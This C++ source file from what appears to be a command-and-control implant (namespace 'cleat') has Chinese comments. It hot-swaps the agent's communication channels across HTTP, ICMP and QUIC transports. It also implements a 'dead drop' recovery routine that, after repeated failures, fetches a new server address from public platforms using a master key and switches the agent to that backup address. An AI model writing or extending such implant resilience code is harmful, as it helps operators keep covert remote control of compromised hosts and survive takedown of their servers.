/**


 * @file AgentContextRuntime.cpp


 * @brief 身份重构⑤: AgentContext 运行期动作 —— ReloadChannels /


 *        TryDeadDropRecover(死投递)。


 * @details 类不变, 实现分布三 TU(见 AgentContext.cpp 文件头)。


 */


#include "AgentContext.hpp"


#include "AgentContextInternals.h"


#include "Core/Comms/CommsManager.hpp"
#include "Core/Comms/Platform/INetworkOps.hpp"


#include "Core/Comms/Channel/ChannelConfig.hpp"


#include "Core/Comms/Channel/Chain.hpp"


#include "Core/Comms/Channel/ChannelRegistry.hpp"


#include "Core/Comms/Platform/IHttpOps.hpp"


#include "Core/Comms/Transports/Icmp/IcmpOps.hpp"


#include "Core/Comms/Transports/Quic/IQuicOps.hpp"


#include "Core/Exchange/DeadDropManager.hpp"


#include "Core/Exchange/DeadDropPlatforms.hpp"


#include "Core/Config/AgentConfig.hpp"


#include "Common/Logger/Logger.hpp"





#include <algorithm>








using cleat::agentctx_int::FromChannelSpec;





namespace cleat {





    // ========================================================================


    // ReloadChannels: SetConfig channels 热切换 —— 重建候选链并原子替换


    // ========================================================================





    void AgentContext::ReloadChannels() {


        if (!chain_ || !network_) return;


        const auto specs = AgentConfig::Instance().GetChannels();


        if (specs.empty()) {


            LOG_WARN("AgentContext: channels 为空(未下发), 跳过热切换");


            return;


        }


        const auto& cfg = AgentConfig::Instance();


        const uint32_t timeout = cfg.recv_timeout_ms;





        // (实测  此处原有与 agentctx_int::BuildUrl 逐字重复的死

        // lambda —— BuildChannelConfigFromSpec 已按 spec 组装 url, 该 lambda 零

        // 调用, 删除以免"两份 url 组装真相"再次分化。)




        // 通道依赖包: 唯一构造点(Internals::BuildChannelDeps) —— 与启动装配同源。
        // P4 事故的结构根治: 此前两路径各自填充, 热切换漏填 make_quic
        // (QUIC 通道恒 WARN"构建失败"而消失) —— 此后不可能再不对称。
        ChannelDeps deps = agentctx_int::BuildChannelDeps(network_ops_.get());


        ChannelRegistry registry;


        RegisterBuiltinChannels(registry);

        // (收敛后): 与 SetupCommsLayer 同源 —— 逐 spec 查描述符, 配置构造/校验
        // 全部走注册表(不再有逐类型 if-else)。spec 顺序 = 优先级。
        // 来源归一: 热切换下发规格 → 输入集合。
        std::vector<agentctx_int::ChannelMaterializeInput> inputs;
        inputs.reserve(specs.size());
        for (const auto& spec : specs) {
            inputs.push_back({ spec.type, FromChannelSpec(spec, timeout) });
        }

        // 候选链物化(**唯一实现**, 见 Internals) —— 与启动装配同一份; 策略取 reload:
        // 远端下发的每一项都 WARN + 记账。此前两路径各持一份手写副本(QUIC 热切换
        // 丢失事故的结构根因), deps 漏填 make_quic 的 P4 缺陷亦随 BuildChannelDeps
        // 唯一构造点在结构上不可能复发。
        const std::vector<std::string> caps_order =
            registry.BootstrapOrder(cfg.transport_mode);
        auto mat = agentctx_int::MaterializeChannels(
            registry, deps, inputs, agentctx_int::kMaterializeReloadPolicy);

        if (mat.candidates.empty()) {
            LOG_WARN("AgentContext: 新通道链为空, 放弃热切换(维持现有链路) 来源=spec");
            return;
        }

        LOG_INFO("AgentContext: 通道链热切换 rev=" << AgentConfig::Instance().GetChannelsRevision()
            << " 候选数=" << mat.candidates.size() << " 来源=spec");

        network_->ReplaceChannels(std::move(mat.candidates));

        // 快照仅在换链成功后更新(空链放弃分支不写 —— 旧快照仍准确描述活链;
        // 本轮 failed spec 的信息在下次成功换链时自然重现)。
        AgentConfig::Instance().SetChannelCapabilities(
            agentctx_int::BuildChannelCapsSnapshot(
                registry, caps_order, mat.caps_active, mat.caps_failed, deps));


    }





    // ========================================================================


    // TryDeadDropRecover:  死投递恢复 —— 连续失败阈值触发, 取新地址并热切换


    // ========================================================================





    void AgentContext::TryDeadDropRecover() {


        if (!dead_drop_) return;


        const auto rc = AgentConfig::Instance().GetRecovery();


        if (rc.platforms.empty()) {


            LOG_DEBUG("AgentContext: recovery.platforms 未配置, 跳过失投递恢复");


            return;


        }


        // 密钥: SetConfig 覆盖值优先(运营在线时预告新钥), 空 = 编译期缺省


        dead_drop_->SetMasterKey(rc.key.empty() ? CLEAT_DEFAULT_DD_KEY : rc.key);


        dead_drop_->SetAddressPrefix(rc.prefix);


        dead_drop_->ResetSources();





        // http 生命周期: 适配器持其**引用**入 sources_, 跨调用存活 ——
        // 提升为成员(比 dead_drop_ 晚析构), 不再用当次局部对象。每次恢复重建一份
        // (连接池/句柄随之回收); 上一批 sources_ 刚被 ResetSources 清空, 其引用已失效。
        dead_drop_http_ = CreateHttpOps();
        if (!dead_drop_http_) {
            LOG_WARN("AgentContext: 死投递 HTTP 会话创建失败, 跳过本轮恢复");
            return;
        }

        // 配置驱动注册(平台化收口): 按清单查表建适配器, 有序 = 优先级序。
        // 未知类型跳过并告警(不整轮失败 —— 单平台配错不应拖垮其余平台)。
        for (const auto& plat : rc.platforms) {
            auto adapter = deaddrop::CreateDeadDropPlatform(plat.type, *dead_drop_http_, plat.url);
            if (!adapter) {
                LOG_WARN("AgentContext: 未知死投递平台类型 '" << plat.type << "', 跳过");
                continue;
            }
            dead_drop_->Register(std::move(adapter));
        }





        std::string newUrl;
        uint64_t recoveredSeq = 0;
        if (!dead_drop_->TryRecover(newUrl, &recoveredSeq)) {


            LOG_INFO("AgentContext: 死投递恢复未果(平台不可达或无新内容), 继续正常退避");


            return;


        }


        // 换址(应用失败=纯 TCP 部署, 无死投递意义): 修订号推进 → 主循环自动热切换
        //  应用成功**才**落账 seq —— ApplyRecoveredUrl 内部
        // 通道链密封 fail-closed 可能失败, 先落账会把唯一有效信封烧掉(同内容下轮
        // 被 seq 单调门拒绝), SecretVault 瞬时故障即永久失去该信封。
        if (AgentConfig::Instance().ApplyRecoveredUrl(newUrl)) {


            dead_drop_->CommitSeq(recoveredSeq);


            LOG_WARN("AgentContext: 死投递恢复完成, 会话将热切换至备胎地址(详见通道日志)");


        }


    }





} // namespace cleat


